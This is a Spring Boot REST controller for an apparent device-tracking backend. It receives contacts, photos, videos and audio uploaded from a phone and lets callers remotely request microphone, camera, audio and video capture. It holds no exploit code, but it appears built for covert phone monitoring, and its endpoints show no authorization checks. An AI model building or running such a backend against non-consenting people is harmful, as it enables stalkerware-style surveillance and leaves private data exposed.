package com.manish.device_tracker_api.controller;

import java.io.IOException;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.PutMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import com.manish.device_tracker_api.dto.ContactPayload;
import com.manish.device_tracker_api.dto.ContactResponse;
import com.manish.device_tracker_api.dto.ImageResponse;
import com.manish.device_tracker_api.dto.MicRequest;
import com.manish.device_tracker_api.entity.Audio;
import com.manish.device_tracker_api.entity.Video;
import com.manish.device_tracker_api.service.MediaService;
import org.springframework.web.bind.annotation.RequestBody;
import lombok.RequiredArgsConstructor;

@RestController
@RequestMapping("/media")
@RequiredArgsConstructor
public class MediaController {

    @Autowired
    private MediaService mediaService;

    @PostMapping("/contact/save")
    public ResponseEntity<?> saveContact(
            @RequestBody ContactPayload request) {

        mediaService.saveContact(request);

        return ResponseEntity.ok("Contact Saved");
    }

    @GetMapping("/contact/{deviceId}")
    public ResponseEntity<List<ContactResponse>> getContacts(
            @PathVariable String deviceId) {

        return ResponseEntity.ok(
                mediaService.getContacts(deviceId));
    }

    @PutMapping("/contacts/refresh/{deviceId}")
    public ResponseEntity<?> refreshContacts(
            @PathVariable String deviceId) {

        mediaService.refreshContacts(deviceId);

        return ResponseEntity.ok("Refresh Requested");
    }

    @DeleteMapping("/contact/{deviceId}")
    public ResponseEntity<?> deleteContacts(
            @PathVariable String deviceId) {

        mediaService.deleteContacts(deviceId);

        return ResponseEntity.ok("Contacts Deleted");
    }

    @PostMapping("/image/upload")
    public ResponseEntity<?> uploadImages(

            @RequestParam("deviceId") String deviceId,

            @RequestParam("files") List<MultipartFile> files) throws IOException {

        mediaService.saveImages(deviceId, files);

        return ResponseEntity.ok("Images Uploaded");
    }

    @GetMapping("/image/{deviceId}")
    public ResponseEntity<List<ImageResponse>> getImages(
            @PathVariable String deviceId) {

        return ResponseEntity.ok(
                mediaService.getImages(deviceId));
    }

    @DeleteMapping("/image/{deviceId}")
    public ResponseEntity<?> deleteImages(
            @PathVariable String deviceId) {

        mediaService.deleteImages(deviceId);

        return ResponseEntity.ok("Images Deleted");
    }

    @PostMapping("/video/upload")
    public ResponseEntity<?> uploadVideos(

            @RequestParam("deviceId") String deviceId,

            @RequestParam("files") List<MultipartFile> files)
            throws IOException {

        mediaService.saveVideos(deviceId, files);

        return ResponseEntity.ok("Videos Uploaded");
    }

    @PostMapping("/video/request/{deviceId}")
    public ResponseEntity<?> requestVideos(

            @PathVariable String deviceId) {

        mediaService.requestVideos(deviceId);

        return ResponseEntity.ok(

                "Video request sent successfully"

        );

    }

    @GetMapping("/video/{deviceId}")
    public ResponseEntity<List<Video>> getVideos(
            @PathVariable String deviceId) {

        return ResponseEntity.ok(
                mediaService.getVideos(deviceId));
    }

    @DeleteMapping("/video/{deviceId}")
    public ResponseEntity<?> deleteVideos(
            @PathVariable String deviceId) {

        mediaService.deleteVideos(deviceId);

        return ResponseEntity.ok("Videos Deleted");
    }

    @PostMapping("/audio/upload")
    public ResponseEntity<?> uploadAudios(

            @RequestParam("deviceId") String deviceId,

            @RequestParam("files") List<MultipartFile> files)

            throws IOException {

        mediaService.saveAudios(deviceId, files);

        return ResponseEntity.ok("Audios Uploaded");

    }

    @GetMapping("/audio/{deviceId}")
    public ResponseEntity<List<Audio>> getAudios(

            @PathVariable String deviceId) {

        return ResponseEntity.ok(

                mediaService.getAudios(deviceId)

        );

    }

    @PostMapping("/audio/request/{deviceId}")
    public ResponseEntity<?> requestAudio(

            @PathVariable String deviceId) {

        mediaService.requestAudio(deviceId);

        return ResponseEntity.ok(
                "Audio request sent successfully");

    }

    @DeleteMapping("/audio/{deviceId}")
    public ResponseEntity<?> deleteAudios(

            @PathVariable String deviceId) {

        mediaService.deleteAudios(deviceId);

        return ResponseEntity.ok("Audios Deleted");

    }

    @PostMapping("/mic/request")
    public ResponseEntity<?> requestMic(

            @RequestBody MicRequest request) {

        mediaService.requestMic(request);

        return ResponseEntity.ok("Success");

    }

    // ________________________Camera___________________________________

    @PostMapping("/camera/request/{deviceId}")
    public ResponseEntity<?> requestCamera(
            @PathVariable String deviceId) {

        mediaService.requestCamera(deviceId);

        return ResponseEntity.ok("Camera request sent");
    }

    @GetMapping("/camera/status/{deviceId}")
    public ResponseEntity<Boolean> cameraStatus(
            @PathVariable String deviceId) {

        return ResponseEntity.ok(
                mediaService.cameraStatus(deviceId));
    }

    @PostMapping("/camera/started/{deviceId}")
    public ResponseEntity<?> cameraStarted(
            @PathVariable String deviceId) {

        mediaService.cameraStarted(deviceId);

        return ResponseEntity.ok("OK");

    }

    @PostMapping("/camera/stopped/{deviceId}")
    public ResponseEntity<?> cameraStopped(
            @PathVariable String deviceId) {

        mediaService.cameraStopped(deviceId);

        return ResponseEntity.ok("OK");

    }

    @PostMapping("/camera/request-received/{deviceId}")
    public ResponseEntity<?> cameraRequestReceived(
            @PathVariable String deviceId) {

        mediaService.cameraRequestReceived(deviceId);

        return ResponseEntity.ok("Camera Request Received");
    }

}
